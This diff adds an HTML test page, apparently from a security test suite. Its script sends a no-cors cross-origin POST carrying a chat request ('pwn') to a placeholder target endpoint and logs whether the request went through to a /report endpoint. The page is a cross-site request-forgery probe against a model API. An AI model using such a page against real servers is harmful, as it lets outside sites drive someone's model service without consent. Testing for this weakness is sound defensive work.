@@ -1,0 +1,17 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>attack A - cross-origin no-cors</title>
+<script>
+function report(k, v) {
+  fetch("/report", {method: "POST", mode: "no-cors", headers: {"Content-Type": "text/plain"},
+    body: JSON.stringify({k: k, v: v})});
+}
+report("page-loaded", navigator.userAgent);
+fetch("__TARGET__", {
+  method: "POST",
+  mode: "no-cors",
+  headers: {"Content-Type": "text/plain"},
+  body: JSON.stringify({model: "m", messages: [{role: "user", content: "pwn"}]})
+}).then(function (r) { report("fetch-resolved", "type=" + r.type + " status=" + r.status); })
+  .catch(function (e) { report("fetch-rejected", String(e)); });
+</script>
